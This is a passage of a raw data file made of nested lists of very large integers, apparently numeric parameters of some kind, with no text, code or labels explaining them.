5896712200708091639643716173583194811893759330933608241239132501522428808728723269042409878584907511185982396646739875471685278081844521876158450652132749, 4303488194636937221082401504691674574033807273927859240933109092769223687504149946323846839224369536506032460436824667651557289723887496316704751924550333, 8224584798208056572030791681314432727349152635236744831492178082106066502097076507687559152175463347000288002004619845158658968128888323828236611639267804, 9030573548168861425468434454348697556192461114808400913989480149123213771499281521094118568490735268090517175258278933782687244164103488092774606624249079, 8060821666363974483716414453457843921789947410415053444060098556748607734694881452699646672228956313926269019434657287737590616449376296742272068260648169, 8805217302520086476758448048680458747124569968328159407361407136363900829867358250034335574176783530583305363125368325145340327567823153474256937672134404, 13039387720251349869229218939399254500407154702287481143838796899279025855987800795719244526341874399592670351486955344301487734507478365637850388086948654, 8521804221367845662111194523181556809378363846442990830538278456797914438684696954717716365855326515179553315465315688465069900887976806601544081096177742, 9757979252247087811167123205687020834344880074527044929439900488878742366683354130811244235643739781014261928782235709759646419400811402028689594880555641, 694517692557555491947393827932101556840870126716423171194797684669768500129594774610644883343528904268274394724703856757457054919371478984289117654164547, 4158944837493124412513672714551827908538635531924038043045389350204431997695231636056180777726944376580609608872409322882640461041484671511486040973501252, 4905906693037652380157280461827652809388154954363664752505193332576522300832577238087543288682335318095422925387249107107532126041341399224165661826185363, 8957957958198573210783698790147794773239543819119119859605902863059226517737849991961182804382634109540666647331992389314716009843582569749410031429301759, 11407635333551458429770804018993963273790527755633566599313609352704922529774057783470009104687682077182139952031050973065708036811554489260663430469107943, 79196103169324772473815215443457424573395432618613980761875639215888847344228378243613581571204938084794435563305586720291612380184998128737009942972768, 12698592345768468312439817807640638926797367699035288832431673464004656064320062645756250845736052137943550215806893376641130978513253884234931099630998900, 10969866894186601570873669940960115977029086496555771070737399482702809304508883000519361968444662847196518832429353206335502226219929257544779067656610947, 8326133220662764624767868615905807308891727328578301828867601859185969046221398011565053843193086946654822577692787672636128371962141787713776508884695313, 1837909748656646948299217517131997645167841581103462489823921027307867587565412963863050991709926493671121230914872990267309267443124142184306093169702351, 2636176405506071130853859574605827649422331409526761706004902454053768798119937707660057116311250918812973135008210624746587915097751585454338854812910171, 8342096231145776217801976827312299164870851898445022448335108395256586090030354053809489180973470369805330925340018192153522317392132769511749301156489258, 10267692131882698922858225248092101042663252442470321956965228669380401111532134324163829513136820630559691153302786161427512720745823658395238162908159288, 12369975841430322360852318921157362420051755968402622622634380564264755076178300733101456810843691448158428314352650421207862483008058130272529959011839514, 10409676818500694231762989993940464236353190953254980403297393323251445595318277082754112975756413180865059767691372237070651063608598776114136170801932471, 4688993304645777132953601177329069003687627506975406265798844865445552835737473796175632946302607211021306547419180056801415286515397500514240202110844231, 12206104713212274410612772800113737025157352223353327132824724244251967478494693225678634340977401294298280915392665411618317803016390541344657580980065623], [4424307612015154481739071479351283715992238791084471783844233981496606635088919580590770343664668138200622014654626610692770575122109241653039985513956872, 11505819939728512882232178437631282032020546168619532754457072080873636281197151828599362822235584143000009650353792304612973824134069371152697843474616585, 4256971155894492976202506101647495879958931713128079554190749079872567887510869255309115480117568273651561032915921182484945433472623477613361436878212555, 1869374744847812162348070001485359198426640489258736944263472535965758731011398306699714947201181672137412478931847628352927021965065987013640668500826951, 11386875206337446102923616814802898851871673793245185450695917267305103717415643271667039640133972616015852587944128413433833008360563444715627615535993257, 11881934473019764147219705344274071117399516732951620258488687277623336063379555978253688085707787777173808296347721612680166418749302213328650916085612276, 3611540832592470716198775080860122964636564348801858206238235244192690926717001566674937429524430128649342461639846103736657044358096783549552235838055189, 11427158282718844301657029286141521353786106010750270312246234741424804291338121123518878665029384112487701479147984483717620751535424107869417469111550963, 13273248631147655524551749176306088968028549101798389900184878203465543045860945163911720704175007522731409829516048720885344672205298148243979048311909243, 7446826927732997823303155059609632923469641861618834803836247577430375846462152357839999148562252325403024997882847450299327863983579183556874638399420538, 1984129500685620069273834556209678913976447995048444908090012861462888407923866670561089269041377931071610111843219092975440952405771263959312375099501001, 7971177426571091865079621081848496458140649661019900149999600862960255654239285653661719660817376584565313921444219981880741611260189055782449662424010879, 9300574397701410189943379967705934299076527263053932868021631111809959397937160341346866270875342340750686153201445621621330107532748401815943638452447041, 8435003452008928489109042384159858718720983065673807154104680614677812378487337269673610586989708465344712686884418918964442550924291279994124830983276318, 3027801952155338780087318584710200485712230202181736670717285428416288815143013191516872199499111570885440419750756031762920787749034165404690701580430421, 12594275551219854023223224413861567255807673083036881480257541513455541817699152044768640027933974431622643386224831359715255641718499790827501954877628331, 8656023930990999130586725727379556634966320262356330037016646812314299146196669563391377022149065609571171563150120748502644214821437150618434261131787901, 1908791633293747286923438478048795802631960350138539602286194210562172997082016005219084421597776011823877018770379677619135677130882764707118041668066714, 12066730058918914838367439947752531123551890795427245030948300573090126052735419646649919698883653375881939834014898193442640004917474937242484065354520863, 12330880097460126416426123085487276641596251461124320851994895347311522148999716302632052113542483131305816276652624857285411030382775942297738093193584601, 7231873534374890515991148181609989604926930569927568075754242528267917864606454877470317561459952265570824908390179590446320196665806400313181727322038625, 11969504795377857335296741372148062350651270295300401013614369662025822393892238236090450189894192466919560251326233315551438773628081883833094478925845188, 6228227680662673416441514086332943099278010016386678287382041491507657594317590776923658150522258666776661885105357390032619477045653550683581932176060564, 10762957718518616630314948030104853713824361632435533136643388943700612191038507810337293924994871171419895979052387615768482976541898067916887575972203386, 5286782246748215769748533570492514546910321893618105459211836117066661972849483369768387982665825456033470359126244225662598780107935239656411323805339471, 2832781966262965563112940310079082315735642505470333810291298568861683869062636715664779281505661353190137765760950100452927192301327084328427461756472000, 4533245837290497641650743274331644190218160570075622396484058331732452986538007596376793361860469676136370639932733140608982446462690883170901978346026135, 287432491792204936108504905491662666038265722208432286220857271096726478284406939888388847838070555590100615887611547551266549289328978406372176352305155, 4670956497846298113794505110271201826830235589095729815722627370628300243442928529560332679349728165381398978489284368517206100395756461405695292215575438, 7081325720513617322277107943782965008779530278930171889957737499283948104445788569850595432871495981871962562954504837137049963744460493579200303421926230, 3915502270353627566519746599726166098409980314174642194089213696268155871733425136334464702921825230680593599420408871347211647457912386064097345285989755, 4105836886826640463901835486578031417224800743847371134421688370474605017327568540083464383125324678629113818194869789445506180629641307944918518524495606], [4419608745069153085179745798781435930017055544623013801249177963863093800981792484450889241183032644486960384746779182128106683056633253931545158938152740, 7039558819114743066500965189586700083126025987305527712323744537025691792186908661463676164582756634891044292470820422561501972021759302995077029803609292, 2942445660140171806755374761957603428366872572364746438866882068371152502801282939498684567280205394553682959500325938450081777067050935587821516028857741, 4253771599217742729622390054940768938908102692976000777418133960950843665410711018586655119374245403278082436377404920272605934043443025466017435419187507, 6617548896916259788637374960882710822825659783963818134653264587441718847411925832297331045535819886452662435754037763188756297368388473190534870144970828, 10365185821373797997591123649832838179695551543169288899154620557174991759928483133255931314567619195701783766472908405065008781607113002702428270561884693, 9693010129796423611866920586251984810688051614917511811733950790183101145824755807663676484224507921815457772594559322492816301045467244783930111732179529, 8321191320544618602959679378590881165825806578779885999620368062918761273635202496219711561237122225097042086166707615642032589153675881833439458953164599, 4663303339000159464269258616799159753518585709484544276887483550097504576388039609377291633239293297869711805225104497296501265184839956729188527622332479, 6195067255898936252909239566229576617091193023874217694795217058161634457773080261132208765490747404807994822568863843264440212203986776858765858361993066, 4769839140481391311354408232107904754453617654440963796311768724948933269595548397002224052111812768713282316713903648754265856785980337352385020047842887, 9215110814434715187043355499732513894098369733703810852283901291176169705364095344767357694088474586487528739273270177498472300628232288920281215806964579, 10720224197053716150103422842339301582729872645179049932502814988367514008584721306966174810283466496084183491129284518993812542388812744336459268755792017, 10966244449361191679571967084501593055731891457435018084811618063800672052674705193651876523813094565339576209727215287139563574378195905636154495593732607, 4616669505130574541937601200633145325525687452353474549532643550378522462679272293535936850982497250576896331843070569603143692879332329245420951667154968, 7156166146097206594751642545430072092978542020824024772092151893822190949678181203092793317686401709383159881293588606320518172643405878782552426031124279, 7917238018974361095380871196529655103367892890717772071839087511482555167961459243075135375622204355437734392597180387532674555981790530223452761982693614, 4620824128629226468644054549481085677692331105398153058141021238297253311218593165489624744166212584974748628341144200014632999961277524712676862330052966, 8231145691502445185712164659997080284945309043512019578768707041151152138212462614964543921740265645327287892357951200461319142275298660632589490528102760, 7703624296151279369309830609438303557495511990573837001840508263474851350470262611984709644173285213374351774204742775458424544375754296323519320199577968, 4791162951601590107026892365168917056728655114242570854101430229322787393323998213184539492263913892624666451238430379277964110592318901975280779294292723, 1463201678812500055149081322324194121925161985290921251653644774043656988630647496263935982566561177854206807699116354927061355184611509016846058772556936, 12059850315929769740304936032158438085446020789898501224302045534609668071085111927604482253962648640445559216246300644150241152937236056051634867431858352, 7861811870024917784405814479690910640628219668975089876910018270056907267052335065770923317461328096508692696689709721735276929840031377081980215541160072, 3077738013746562767412723728709425600423399328830186877107831618092152006658465117115816927297897719629151083182894651056448612285169638676195060439678009, 2023230222303986258864341048724489897665424015099283273352793955638851854408841410356455814065027964727612966009542530158972474026678545275847983291913700, 10831348723846367494652130978512289685784556971966676720345643522844532185921730851119587620134192231887432052463921710217377786384973678105256385353040932, 2531799294853118855620579736013075254053847857862877598971296590269765979273805639035619602139029958092390403508053188281387502684175682265481227786921284, 3012378753096308937199871520604708930163577261585404261598499218273168675389005782752888290328673830113658460658089960398689171219742153706330342899289526, 7905954044748938478543171893752259073339741915632500025849431438299077180419971548502208867671834401264301387122777949547583824825522265829427830617813146, 6479625189025954148686791749399515404502436851846499281692305987451426801166427214575345079331307772335495029550844899102824679090137742068326371868261433, 11289106104967478791521093188640686656392573473364623467167725136910755807505042922876548388889332762786900065688362904413527547594002775787271863568626075], [1294397068744261043917636030209714646815404521567596903217597773058821791188132991225386642398366927874018706801083763963519496676146419819648786303881952, 6703574079455766611135415921147767330753955071633861946922122709758681329080275347260207037037610621999301782716455910464130857991781402845251651097196988, 9170572693394552722198777498454348248895031998315097390677208049358595673849252493538828016036596315146483723636931384720448010120444578332939721124691267, 7217606848224616991588676118504488883146384343604760710815551774978539923995880804594811655311036922710835287267082804104704397544091609144975883342559651, 2942297398605162486915739213104707522886182703561327981114356119205612958245127896689793120657432585991477097470141908753191827642263386846622285738559022, 1625370154130290984892606863637822385460592157653432786271148960553461523707642413894911205170942557860573859917575617376720431295233271131408316963777226, 8077967912400292932056454357973579829082397942080591943673491041835307857659131032698343573073379415616255289314929470652704177049424292181261053264656231, 12139907774686001996246789650609359101198975284713412162158134846610868913798905015104913490005570142731093836934404114116400377754535845514192092612435139, 9722500940545538705937570523512347317766328530240418981349624972163801787500853811796166908530734411203843879231762265524813616413607213780416985975828899, 3676927471665975239523187934340692264616719462226726896660206680973465851277266375354129920290603346130350890843463748528503369859711051809439809979921407, 209670057060579255025200195757619571540780289770515728518243350095351545755311975838458751640346961092376282107405227684676493895969041018434153277276606, 3313673200108626186163875910848689776044213654793263648902791355959276709607305952301106853041342338437644117145698205811056121567582510571636760476483335, 7934579478383028812373095400453151021893180030243182190036403791269865112033394143711112477623077886858335396971323441135146840422137996040311037636818727, 1306232892748416560703659499794144866183141743747455410352875901682337259121597637871264681641390638325450241930049676338400476183133099664081779031961712, 1235203763584095392002754861310719804000296482723359868325995537044324601613402188129327540802998877038903345420444105374191652461954835945636610334715430, 13218102520852888597076878123104280097355691046786098456144330070714721226364485318598739778140347701207829524184904900901401369398840345579987803184514828, 4429184089401271026794156527988743015046334324635822911266104970453837667176193093928597368830980669366899013985879939937759754073147651799327290482521709, 8889577872175638933346020298692655722134062096888726936254484212694822038786739230115461446474093673885716976630276375861163048496758161656122479036496278, 2937837438544353656398937820821199450873713039063017684923332278095254404541685100421514615180018414662756615116812221770520392865987121942652936344392236, 5805032679491215876741117023346407205951518717296999973334616136949633667435777575372609940116241624881169028084344095175627385963584695349527235843144046, 9913932612043122041928831006071619235476143697515879101602821963287785506963215738907027904252311335243633922643529551768527576959579533753661123206435030, 4330600459366623578548786863277573766749334491284408808857282666209343923241239498485489175166249277743659131530854790371016673111916429260391511070977490, 11217682464796253515507084360905119459632332028423354413699543414731604208151979191597594391726475942026049639885615524680462073629691255087773910848045458, 3804952373844480617199969272127624240142820186757376785719436033199423926964846495796027737970130728585696044706826885798052578583842154227857405932988377, 9402540915898127839971148728225498564074148904111773881779686570248538428398085492959608891042843571645581935041285373904999923264376694520186606495304885, 5861690626611661404743446174585501664266991433691551926085592642929366878782674509747068743617391152591767430150378735603108443159081197299328102999541889, 10712424901084409253062724558857942258893207488412533173944165216325488854873796524036114910191928036184909970772641662604039563727430090222533028111747576, 12724713088649933171068844287733536159099540028729965863294584889994163992319473295716683420248861717352274885703857626864214825031534770563878348697989383, 11084360420117365725340312369427162069617243892186044263501731112850999099797754670185781358702741252981393022138805869832941866950281160237691252846203035, 3376465319090821089949485573910973132300782572795169158188762839392824580452923259090945763198510666875616594504632535524229552835272788559960307321928666, 2603102735713783324277900586698789592277943140263212217300898545794575428724236615291657783231929047402403092143763716696062309177874797789340813280267220, 12955113507409519437300117121628076459964108841026447405735835140990193558527283482424398439887661595414905152831437759567364876039565245663538662536034542], [8808773631556055016598356429074866033392329423163368320632486607118807299903465500715184693120648318183004702287725415144418486762312096558965633155209470, 1577735678584821351044969717690318629200557768224747534257204338954737240368177043090838226136222489373649799649115386325476126181114412676289397483594386, 1351264643971038996549568817476035426481244300131098110405097228517833938953886128348854888223214811601602676661376149826225522879831698840785853739556524, 9307531746730580680911660093931586434864672189556755302699559207828393551924156906794195222485460301124929023677490777216614498270989898722218116582109579, 4696533341364899191533306335364979502859734067149781194406754230615914179740298902573152850161985032716346186848864860331849751614100276714696122181054615, 1400568234351955592240636791744548705535149795961180113909047771890448710249372656772168057295321995463622908353341225169200304918194798474212919519693049, 9201676831789468685464636684491158328369328130428650292891707581099243980459732478378995897773405725597141944567920497283056120380322162646654685400521283, 12492716523663052070228244959553007779854261008544199293607284442494430570773425308826771210590063610089294852065366456548086756993305078310767533924437675, 2809437341675173326873976727866305973116264473779925100725111264044830786464259940652278120873199909365881065758848062692263441186348425959571313135491421, 13177497289024563861862937196690188745864683976218945030980358429782005043311875388085967915602893129247400393938599564911903335271097943282662092300158526, 3439260681550049625851844722371603278413021934186410708654794073713317251659670681293047581068328775210554858894076437671625118630598783572001582168420959, 6625341411217901846714082099257142646139203345922120843060108642984153272535412115225959541004063788046475993606117439489740148507219582882851829842794415, 7151913711608528732276056484277024016972861201095236582042743693508511286094246487281518387545564590115348105724762296689138027942601007373473294893431002, 3345184747067659517306382789572759899422892349329528429332244853684005396367358014995322377653358165576225110301912568126474999591703585968113977868398282, 2338959409496829135766163042470919146786092840833426487377829132925420540569338597771071562707676987872005627189485669525522949607102810196662039495000111, 684434549026152359598563212538207975573047338327550922363342479149377424155646043259072577735934622734413426742845206322568688266445074241050201593776179, 1398145908319243926174885921504932538760423255283900286209630216304511297992495047117648671595933175652410132105660723347395666791551850286704625217495490, 11675786275005735193157102669593841728021334961565895067550780706165564272440136517137699820689712610927537456041189255246566409067551245784585550459283937, 13024536122016184454385087326531693078539115612935819322167264356673201715027104560949573620173253338562319923114726420587552493415103605873301539871957538, 5472664410458336137443536946241161894044205880713432015511464133286868228794556362868382774642006817712939471940522926003515140469896520090234206656907859, 6029656318796602792766221781745249013321810093170635296208644893652264017883479778070681129398046561435150449099785808045563784701718113737996095640069114, 13293651389656535801670530969760533824593162666285761806277783895563811800903582453482548978586862352002175388005014819336461855378297946217623977177687519, 6492324731961126826829856757689936478309197361716939580813250077672324355166695392810267030394170148617667011795067485196217652302457753793220265138121925, 3459978592537731182489672730497225494712447735526634342510463848155854954511462165612896358151895727311817097450221355942282307564060594706621159816285910, 13219812277762801228151173919497508936391921757245338610303241160745756190549382953907827248278668085042012697648840604728317320671332997750510573795715068, 8729389553203079461396994535272432027972863531164052020033006584771391401753812493295954892650913726833360840053235591530046459803315859106949771971111565, 12793634370081236539803059166590631248763808395406971335314067582093691380780832101562963101895742834421716229323083501125951148810158227152677405699892689, 12987947141204030819280801089134579329244087517823443568371123827173644538363599694183733106736321301576309376761926386886843273648345209995436189243898621, 13334432465321809456245783233585065908894877139988993727269205042405584656318382024171340097656462179746541161261109623119504372807281332691829840626071118, 5768827908428801097860786233054863834974922449669778468249150747143616241300829870688312894064616884154401709752265337934884524035898060027673004898678882, 1205996715949963843358621445910683006949819814785408578786870627778362353022540046051541265710639393021679582339833264176934894782317054174038118374280590, 803222046957885427524181125799851372383205783487841399960358761318667592078745519817501538949393100495347345029779444834771863247645160312732981744315796], [12225578082954091561448751229838499574255868038978407918053968597268234877951640524820361925928809872289095790659503240298852890131345086408411558735013354, 7759884688651617657254899116020737125202284487391553525630342891805407244818500117848936948004150996614129349993399439262371224614318404560661985326392139, 11036356130971119805557190817023776236664691876359298674115178123000862578595425153854762306983516262034151714132043473971261285686738114527995855572200965, 3756447092031671817418795175017347462942757946120795892415998339731880700155289853519014786073894296094409359203875999370240890677478252976046199601168612, 5025595666413626221507716634241051192970393204879284993910980715958849737517766745421519762339094046366147260616839653496804996518025399008795340299490770, 3107653006331179072701756121526853799820220526563968443333181196049805779588264656449602296210450178286975147768702773485412774283385846661145274399014850, 12229138795657378575892887428225059601889668096405312439320260975997207471002312461408217052343908591857306601396445278274233813704559351781726757301590262, 12876293447414449178973676357466602320907519077335383023681034251308284813921373629612988690130794556042149031352897987104137863989322017388541582976005330, 3995337737679156945401903068418800849040729733461657143606634017417339507273546332009016120481410869591784549397209708134451438527583973958999308449309383, 10108816653369702162395803230714424274913718982785407347040550499138990412041215109410135316278073332702361153714368306873039745831403735000535619315094936, 7158084317083524447315990366602832296557822429728684862619611088709540799932388878680748530911413265823512224327895495733056004743280826727210869012055927, 12586202078843497112017486079733843269010997347702695094147931784541534630228832490200974937256300596778703999846848666941414743155549092752762131064434228, 1252955563926919272388635506209468350872792003049323937477771665125194385828399962398734975258119408469819510467622220941711821927621149323372331290510468, 1322398456241151870029577853497219962435859450409414040455021630885970203118606976271035615561145053269106215260236144615483653216232853332259369227210202, 2008830875702259381754374350355822699141240489994740354583661358470603246100455979879013258948985539085689663761976511438397923047556570695097023044794819, 3851835101193718920368612729045292808670451753849117007477582437830095876938824432671530648441968135796747470986927282451972103253002500363249307454816614, 9350873250939561618743715686452531501816714033981777604946044495663697803977871920107474719343515701506372589681171592355215854908928054288735459739470108, 6229410485015449276359174297429322485959875765752796665796586985350255044533053197762962874065337154727266602981550934120953598307170474603869039889942773, 3376437943352905754876389236279894644706905949662042270940894331248706518245109435084141439062838357157123690679242688412708539157259724205705698623690374, 12673855659658036419208902119503531296169724315181477195595038559940878889717727787854753488566353295074985985818236283702531866236753959619629515670236053, 9255235523795698614234181624356781396290887926743113440574859814383639713652898805006032662529714328889320052145185157415479041598883753223513042575546841, 1790884419071337085850360084260667314133189410952218328638132984469792509251779347506223257912922046687247144163574305714360357676463183394557559669588412, 8793571246971357541281408998231123767928762755932481465185711150097657608965896698944872942984305615063993135998790114861455759959811781653378768486471158, 55284461935168666874783534748650568097574977342403568058671309102038306528619707523056162792790072146045230811579594146219725927848129366148412816537476, 6959957083931359290054920439985033936662046038111908145975458396758438377105367849953985621115795212041187078728990272177416774031715630892123351720856580, 7060503363391128649245687426040425880003760501916434119376474575078005647909223613687108992208544853871433966457396495857620824507890947091169328355659134, 10926278846960846175935748221042866696519233289867428115994907676175957285803534122604186026536431614070220004286179992570888896823050503370368431877350735, 7359809681040426604701995458861198966235091052475714232068640079972521055750058662238751940170714565902583880371934094710040516892637173626831034594774118, 13082053180586109375028313844197995616962055852621620037341119249654985205795139522418639345133150368722272494687502423539981593375458853439574534464233190, 3595199588699562724341660383388523679935341760844225037661771729574478559734800897779378415891772960289705624427987621432149207020740950967819029359202118, 11803046667342413019316171038331949900876696040778766693749484950433129762006148248432064182105180181037989808038660763961419779523040431663209498151561819, 2544436458510190375709487647500723676073436107360462164396821651557504752856322544639593032358061636102686812466009673307198461492089270771988155830717557], [6105549430426151688293914382239927048690225347203312828317936045206778779122032647780647687115330738435346041964944757556170376406187504882807748880459038, 3573287773910285972180899810142742464554593570323186004240198769500866549866269705473676858842400516965290829160517363460750267251960037882132089170145971, 1152638831872255460256878345620644098582532671691194541964830871429000269552161767557855718840652691538899854254618997435549759513551099354255935040152375, 1880419466479169331763373882423570318971093428589693432309051817490339440960004863069083818767561433338156764573946172228361366183695835612075834909407470, 534260468332737281844108659337110091448687726024727702242958895498317514349480873280621061745361025517922179996433241180514638291425160595017893180276951, 7911250182684243188420148499639816071691287825088504936954055871763906854561237455916177797150255660887813289489708495754664363517716832862662553671500904, 11089666692692241491311800244508700790476438646758721400252624174567546841937876046349854991530050068628057189982314871732496231765634262313214426347297687, 12467767570365481837005175078851103387202936854801813579936261859855590573700715144768236888827166179045744194220679955896758935945686761983464134522789898, 12631978444452173812699999039021640903952191355694165614628061028913806793551072140082404599294596583903821314819585032754944812999830022390643750468233535, 7630246827561343763858329054178080685049654304830849718669617960327595295565109934476651795153506236138185368552477393585926573325373770948920880012234678, 1136508568123182544922344625558314405427199062619540645188918962929994058557979726188636538411263360271620873081886998814697421196855594802138564502436648, 10499119781681132800006994510847778930545800812643479468125885406145260620791083589838847326765270039443607479428542292495498015288548437768537986143016853, 10274577349566404799347532446686314825460211201262133182596880406231244074229176569762663593968684789234946581884011580347254716691704638764571552872092774, 9262669797144022276781791778997860930739293949502376344065456917731684101019425221119367282079934270548434993624003806898821024211615560163951161517931166, 8125870531042566685429469052899177529152917839113064829232456101864215751597431496143193736990531853269585582814288637226808398157667208804508823039510942, 5403758760440452006526694631570314779592619106696135230461713450072985998302949216569750225392021499642132648359965359437530300206820250136637262735180347, 13237743386699778723322876981714259417855796324776827417296394846791516805559531546175447871088180824617523573365252935097552557934928728217865867361409256, 12904272157278973182016712162919422651103201527209367978104307534440251571694216325073870025429758226453506337430765371676973393040083023276803955515001851, 8992080988823764183076108345212842109613421704438203032078983711015679055525579259611231627473941817076975793377147483597041583535461470257365272643475596, 12294390294980856247099591283811143283459459538684495321203963366389363276670416866912322100890467998231678010282515387519815501616110630878700343789457654, 9637100279074183631917954711287360091396955107819251083039613715054828578082446508057443258904319900012999312511340357235995628342562715770878235556948557, 8802753423153813745968420125587683977554820027004934855927261717127426485106297302815321242038628737358027866681110600719585454227878558416859538562629240, 4721099520683674612102471608432611925687972908854435960019097792180181655208518634014765754186345366442026474168877526362519141875666616078278215177961750, 10513350101687707246849832065357405700772079012035704574574134270647473136564649898337083715418547060607170523621820229180643179390354496871149706641250462, 8506536415448810751566108030108268531334126091079069648045803585228455806771935402098431063862974090770240043619939132224701706243354943290401181846580781, 12109400968961024101073463956340243117013476365139644591212824156163893351498659323358126606378312953919083052609319025051851395716529717338816955326829926, 11790807404795955838515419495743144432425034742062776748633367604145892511472003498664965968467494271268937197064817883221647977327371658218130583457138694, 9220133171085336289163429988427989195421670803341183446438669674013268683446314436444411929837123362046496350700820457247556792802447185659264767876242753, 4405320822576004045763957378815913357443828777579247751640546959838288527768521749073541030461839927261900648818948501522620737131433509492145021197861046, 10035687496115326537843708847264216663803359911186833501758838459215755774377294621929081725908374448323045634835201983308910213387331612990254066531122858, 1165580218050575742140337754299827614690704441855374271662622910173560505322731287896378608451401647645033506369096350048734229092696413013442606575589799, 12597392273156717619146734648273617537461434657806899233404310573141390585608694282816466319838079274984637533739791290194450960989815361811360254307928560], [509964940555505175409744053944058023575554219644211773151355969801238892689784495948731645644898383641413640634086223635215822279701993884719271357235223, 4727013026304179539153571200875429403513394034813412251508160937108359171941126197573053408226454600561265126125385437722527519712701980982825936762997150, 9632039416745591848068046798604407856177018360077796486017794210381804686258803959641575051351557364433094689835997088893972520905015882705536204110447820, 8033981629710260718620640857196099903337934729212502089341047956183269472294388634687656063823836673855422695087092536080094915205007492756110394181882038, 6152716124213711507088508704671561258248553037922802813640246268249161711901794147258534458003489859690361720145917214317769921617581856108869439802689190, 2733729773714510516597423463060884284836085645251963368142391152053058673852292177726418266094990741987555499790588815924314069958113144234238957850578966, 11866130480064629214141512622264496453262227550111494880125970821560227122338176390770159238283106083895105443462446097154337639572856827994362976475861602, 8542252864208816362099677336318638168861355820370170030594051269100488398607804035673616228930459936297831717273346162060266301621293481047786977917316510, 5383767512330134641081088795637357083264028813816338488370302641101747803446095738561496629085345822680101123836979227344613457234046815239860955305881010, 6173477024827098059693293650198397338631077410092290996950439638882469498201169473606280925958567683925405340186025673616583516965676096039892239127384681, 7122880826858573891520704360983927419444469132018820472068762681000213665925378630724214340179513346991783347216289534402794140311559037278753337593348962, 9459261220994677991580920973989283921821477625713105746111560929880649925176059576447972786500227937263240572094889090601251699543635345936299111905492897, 2478698718498995686067271811059859324306421034105041411741978236283539840572713954403104776158575271178843378128008987737376584975392800959607528995856521, 4418490258982763828385650488903495945156165887072347348143989714312884993246402051326687056442168262256630362986313138390611781723832938144219032673336571, 1985434999606867803457231852248841141833053542418288997389667811671775446185118434465181577227787827059429405347236629541632763163514842512266848665996556, 1361181863936250101044386656893458971982961941354286210404043148752196418772578663204189467880484484946736515611197172390430337788618260040314351522215845, 11251778694631610750142197104609746983309858937727947769412825050051256104977964764815536601342785061529964752845356402590519880163458833819243047029489273, 6554418772942290725338873504884315749319923229350722202403433008031363622379635260058353539499691850570329367212343502378806066022506709877197770829419529, 2346678509609762860531489290676425379529639607778515921114399613389265827110491404257689111057631328384713258338221568729825869887280336676941962365305833, 12682056435876469136666475111192221670608200544037002704212565363133046219126675962087583545338408877522250531623094375718613044087794452534735182805842199, 6702244597114467522966759802851901354255899361663567522203034021917760224093206961768298425369309035775685885896330217654911588874725633955568970740367096, 424893929632188063386628515817547065583305489791202438935160226941842801600744525180763049065137074187024786287753601507532353221767352758806609124056847, 536780170094457685245083163361396878766452953567179721905957351569096641090407562422120993811632033830921888519490402845854577610108755868360219025591249, 8818896124172801315117429808232181295156750659474391408245518954833853940297524355278326071336742200191247119001114746854058914339805509263553777529205971, 11214025272139382048322133233356097496191515250638615569921544652542440497371524743375736842828194232394540062032979711841276798673320398734954926176120214, 3672232197369978917163089445455613116983910467841119089003204260292034096231830584840762246369615232377426631524285040249507695091645360275924068429359128, 9483807923804998733891166397940522101835572372830171815188058530954133373488117687411103018621343144824911427838884713041915953423634797695422130792915113, 1777617524438466081311011535516337659074500635793565204077481612991005966322340635193821197800627305651256753549028444463969081228665769587930642443876097, 3328401070306466241774901034605930830664049244014527696994720834518832531754091478299382380653238780749806230627677021770548247306274505632311352118578964, 621283468123104974792085190812071782229133676186887527503914469964784121035608624432425176645856348339992184213650542037235600971831036466732742803520846, 1616007027976090569889682666936673479642535596877623386502949341467731861833683576324130604066899906597183993847213426233667660083040421266008762245904598, 13394134758666558846486913717922658845513651144542782856285965562026010661154285496957450702759871939858777266215560684334726099647049733306467607587630603], [12008020930770673814859300810461904297684003375564452020757289996081362578223781745824162483145373805512389153488367918637705033984475571419513656835735595, 638411568394695123510507348193459985476725513631232854840100379714592950987357498244287702544217205593962806089141595106054255492103762177349424684312142, 3316035151256265125546819484985511173775585213542769798205025811406100136206680118679968970398349437283556017932496791144963616859980713905044407152252367, 3659036190201593703276377907958038747020907050114157312853259708076822352554259897001210962218123969725490262773470326275342897250918891071950107878026464, 7491986357084370493424478732086764506450192249241519454084211091143685875044301719301963295033079722256727048786745348164356795336905805717920632415173717, 6049902703991300934297919984095029723497947521769405319368106846800630880557855853759392023537813241504861841714734520163397748321077646117817718917870669, 10800050206564918430327886226258245393885906028823799275547487973782508958230481551092788902254318959087694119384114297166162889326681568240108076312115720, 7470584073450809204038854992266159858835140394297571060507280194175992694291903183268899921368776926823260931047726006723894661327813350344256027376136932, 7215952328204782101875758748000246652000200199214480370508003273273359921351550078362264078713372631886357920316996625550469384138471195637442531848133255, 10641164847309074184974435773082129434880997865315435221065740305930483488806518189714456038535147094220091698335330933423673112000316825173935137332130646, 3734804001803340876918363388438663748079874757717211955165564656761404759881553529329289361865266005131261429129808416748259461032505048033174936445492322, 8245067794589841703772417406984260491113315650354368291390706899883848972464334273053199077829949765545885218089823142957501657050741849685652351644623117, 574599832248509857964648265695796695550009956071910065728021056729527138648516626405859655214349550838562028364989916140942119895259059371497817965239588, 11774758701289114165004640416684465195874621690657114013871610110439379789266010747446224780210355453882156584247676061596700979223482907264308850589472597, 378373442609204654088777379912684912903017052900819236636054797317041356216270395355755514285074388717545378198224415127300290320420841727591364550069162, 11224369336093493320411930551255424304900889638005210340815784744635187907785617189849564034938744400613016445288884002607913503348516906291048661002129905, 12227436042862753267032876034144006203364156414275672352933631150850696173104023060215135624147507478276187046847503597728179397917083362367749386845042361, 6849701361285416610491273028713123158453490052831745609249290668533232248083035908245383774826512054123935813607183332407558758548690385573533859217322897, 11841202022698575978021727807583659151384442863213596052246995191893818620695850011147758550261558184361321146412744986974748017100028770153236942067482393, 2530209613145072458622700939890853711124028326840639044213581470963257334152599858398267026031561293187470604270981292972606994703385287823016430410070718, 3032996611769840090899121944206296941525452770835943084873608384967437596201037380461709586365091762389592229255089554867793447877428386985124377279681457, 6312043648396260463577044126616711886560591897786307829625575448876135226691434880208804875387694760501041812410193074254091695334356259897183394787186391, 11622082259599448432259386598528336225488700354311484402343522943342572900624869325468268912244510270025277165007536354018907580447265224494965036476703505, 6476501187701698086703503422922994968199020977489036760966274470871728955853829235966448538569683402268009138894902181786156007247882538029526201514739779, 674585861842780534945684156400372907334166811469622948675323503378453085710844622276365425669345639342661334418264958728518291433478679171677382018848212, 11494779253527513580722155721706321894757965085688306110911894022878068382345433050354676844198898199009913174653094223971305713220478105203477260828163040, 11377609445967331320617215173336655362179492185427028194187332570972839920075414388815133438662179774100740109442326184659741899812106262527909438151580300, 3942495338189477007887594662166405467759853910072209268912932583430349893359091774617193454973946098771926094364494544485381485355954258563667222417056079, 